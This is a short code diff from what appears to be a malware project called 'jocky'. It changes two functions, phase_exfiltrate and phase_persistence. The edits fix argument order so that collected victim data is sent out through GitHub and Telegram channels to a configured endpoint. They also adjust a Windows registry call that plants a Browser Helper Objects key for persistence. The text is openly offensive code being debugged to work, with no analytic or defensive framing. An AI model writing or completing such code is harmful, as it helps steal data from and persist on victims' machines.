@@ -312,12 +312,12 @@ fn phase_exfiltrate() -> bool {
     }
 
     // GitHub
-    if jocky_exfil_github(CDN_ENDPOINT, cdn_token, collected_data, 1024) {
+    if jocky_exfil_github(cdn_token, CDN_ENDPOINT, collected_data, 1024) {
         println("    [+] GitHub exfiltration successful")
     }
 
     // Telegram
-    if jocky_exfil_telegram(CDN_ENDPOINT, cdn_token, "JOCKY", 512) {
+    if jocky_exfil_telegram(cdn_token, CDN_ENDPOINT, collected_data, 512) {
         println("    [+] Telegram exfiltration successful")
     }
 
@@ -376,7 +376,7 @@ fn phase_persistence() -> bool {
     }
 
     // Browser Extension
-    jocky_registry_create_key(0x80000001, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects", "")
+    jocky_registry_create_key(0x80000001, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects")
     println("    [+] Browser extension persistence installed")
 
     persistence_set = true
